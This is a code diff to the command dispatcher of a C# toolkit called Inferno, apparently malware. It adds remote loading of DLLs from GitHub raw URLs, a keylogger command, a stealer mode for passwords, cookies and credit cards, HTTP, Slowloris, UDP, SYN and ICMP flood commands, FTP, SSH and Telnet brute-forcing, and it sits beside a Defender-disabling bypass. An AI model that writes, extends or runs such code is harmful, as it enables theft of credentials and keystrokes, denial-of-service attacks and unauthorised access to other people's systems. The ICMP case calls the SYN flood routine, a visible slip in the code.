@@ -10,6 +10,8 @@ namespace Inferno
         [STAThreadAttribute]
         static void Main(string[] args)
         {
+            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/Newtonsoft.Json.12.0.3/lib/net45/Newtonsoft.Json.dll");
+            
             // Get command line args
             string cmd = "", arg1 = "", arg2 = "", arg3 = "";
             if (args.Length > 0)
@@ -30,6 +32,19 @@ namespace Inferno
             // Parse
             switch (cmd)
             {
+                // About
+                case "ABOUT":
+                    {
+                        core.Exit("Created by LimerBoy", output);
+                        break;
+                    }
+                // Load all
+                case "LOAD_ALL_LIBRARIES":
+                    {
+                        core.LoadAllRemoteLibraries();
+                        core.Exit("Loaded all", output);
+                        break;
+                    }
                 // Clipboard
                 case "CLIPBOARD":
                     {
@@ -72,6 +87,7 @@ namespace Inferno
                 case "STEALER": // (PASSWORDS, COOKIES, CREDIT_CARDS, HISTORY, BOOKMARKS)
                     {
                         string s_mode = arg1.ToUpper();
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
                         if (s_mode == "PASSWORDS")
                         {
                             Passwords.get();
@@ -122,6 +138,8 @@ namespace Inferno
                 case "AUDIO_VOLUME": // (SET, GET)
                     {
                         string s_mode = arg1.ToUpper();
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.3.0.0/lib/net40/AudioSwitcher.AudioApi.dll");
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.CoreAudio.3.0.0.1/lib/net40/AudioSwitcher.AudioApi.CoreAudio.dll");
                         if(s_mode == "SET")
                         {
                             audio.setVolume(arg2); // (SET, volume)
@@ -243,7 +261,12 @@ namespace Inferno
                     }
                 case "SENDKEYPRESS": // (keys) # ALL keys here: https://pastebin.com/raw/Qu2gueM7
                     {
-                        activity.SendKeyPress(arg1);
+                        keyboard.SendKeyPress(arg1);
+                        break;
+                    }
+                case "KEYLOGGER": // (filename)
+                    {
+                        keyboard.keylogger(arg1);
                         break;
                     }
                 case "USER_IS_ACTIVE": // (null)
@@ -387,11 +410,66 @@ namespace Inferno
                         network.PortIsOpen(arg1, arg2);
                         break;
                     }
+                case "NETWORK_WLAN_SCANNER": // (1-254)
+                    {
+                        if (String.IsNullOrEmpty(arg1)) {
+                            arg1 = "254";
+                        }
+                        network.WlanScanner(Int32.Parse(arg1));
+                        break;
+                    }
                 case "NETWORK_VIRUSTOTAL":  // (filename)
                     {
                         network.VirusTotal(arg1);
                         break;
                     }
+
+                // DDoS
+                case "FLOOD_HTTP": // (https://host.com, threads, seconds)
+                    {
+                        http.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
+                        break;
+                    }
+
+                case "FLOOD_SLOWLORIS": // (ip:port, threads, seconds)
+                    {
+                        slowloris.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
+                        break;
+                    }
+                case "FLOOD_UDP": // (ip:port, threads, seconds)
+                    {
+                        udp.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
+                        break;
+                    }
+                case "FLOOD_SYN": // (ip:port, threads, seconds)
+                    {
+                        syn.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
+                        break;
+                    }
+                case "FLOOD_ICMP": // (ip, threads, seconds)
+                    {
+                        syn.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
+                        break;
+                    }
+
+                // Bruteforce
+                case "BRUTEFORCE_FTP": // (host, user, pass)
+                    {
+                        bruteforce.FTP(arg1, arg2, arg3);
+                        break;
+                    }
+                case "BRUTEFORCE_SSH": // (host, user, pass)
+                    {
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/SSH.NET.2016.1.0/lib/net40/Renci.SshNet.dll");
+                        bruteforce.SSH(arg1, arg2, arg3);
+                        break;
+                    }
+                case "BRUTEFORCE_TELNET": // (host:port, user, pass)
+                    {
+                        bruteforce.Telnet(arg1, arg2, arg3);
+                        break;
+                    }
+
                 // Bypass
                 case "BYPASS_DISABLE_DEFENDER": // (null)
                     {
